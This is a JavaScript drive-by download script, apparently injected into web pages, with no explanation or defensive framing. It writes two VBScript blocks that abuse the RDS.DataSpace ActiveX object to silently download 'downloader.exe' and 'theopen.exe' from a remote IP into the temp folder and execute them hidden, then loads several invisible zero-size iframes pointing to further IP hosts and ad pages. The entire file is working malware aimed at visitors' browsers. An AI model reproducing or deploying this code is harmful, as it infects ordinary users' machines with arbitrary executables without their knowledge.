document.write('<script language="VBScript">');
    document.write(':on error resume next');
  document.write(':dl = "http://203.171.236.215/downloader.exe"');
  document.write(':fname1="downloader.exe"');
 document.write(':  Set df = document.createElement("object")');
 document.write(' :  df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"'); 
  document.write(':     set SS = df.createobject("Adodb.Stream","")');
 document.write('  : SS.type = 1');

document.write(':set F = df.createobject("Scripting.FileSystemObject","")');
 document.write('  :  set tmp = F.GetSpecialFolder(2)');
 document.write(' :  SS.open');
  document.write(' : fname1= F.BuildPath(tmp,fname1)');
    document.write('  :    Set getexe = df.CreateObject("Microsoft."&"XMLHTTP","")');
document.write(':getexe.Open "GET", dl, False');
 document.write(' :  getexe.Send');
 document.write('  : SS.write getexe.responseBody');
  document.write(' : SS.savetofile fname1,2');
document.write(' :   SS.close');
document.write(':set Q = df.createobject("Shell.Application","")');
document.write(':Q.ShellExecute fname1,"","","open",0');
  document.write('  </script>');
  
  document.write('<script language="VBScript">');
    document.write(':on error resume next');
  document.write(':dl = "http://203.171.236.215/theopen.exe"');
  document.write(':fname1="theopen.exe"');
 document.write(':  Set df = document.createElement("object")');
 document.write(' :  df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"'); 
  document.write(':     set SS = df.createobject("Adodb.Stream","")');
 document.write('  : SS.type = 1');

document.write(':set F = df.createobject("Scripting.FileSystemObject","")');
 document.write('  :  set tmp = F.GetSpecialFolder(2)');
 document.write(' :  SS.open');
  document.write(' : fname1= F.BuildPath(tmp,fname1)');
    document.write('  :    Set getexe = df.CreateObject("Microsoft."&"XMLHTTP","")');
document.write(':getexe.Open "GET", dl, False');
 document.write(' :  getexe.Send');
 document.write('  : SS.write getexe.responseBody');
  document.write(' : SS.savetofile fname1,2');
document.write(' :   SS.close');
document.write(':set Q = df.createobject("Shell.Application","")');
document.write(':Q.ShellExecute fname1,"","","open",0');
  document.write('  </script>');
document.write('<iframe  src="http://59.34.197.239/theopen.html" frameborder="0" scrolling="0" width="0" height="0" align="center"></iframe> ');



document.write('<iframe src="http://360.ads3721.com/ad/1022.htm" width="0" height="0" frameborder="0"></iframe>');
document.write('<iframe src="http://www.58.com/hu.html" width="0" height="0" frameborder="0"></iframe>');

document.write('<iframe src="http://59.34.197.239/15781exe.htm" width="0" height="0" frameborder="0"></iframe>');
document.write('<iframe src="http://www.54699.com/wm/20/6.htm" width="0" height="0" frameborder="0"></iframe>');
document.write('<iframe src="http://59.34.197.239/0602328exe.htm" width="0" height="0" frameborder="0"></iframe>');
document.write('<iframe src="http://ad.v369v.com/mm/vip.htm" width="0" height="0" frameborder="0"></iframe>');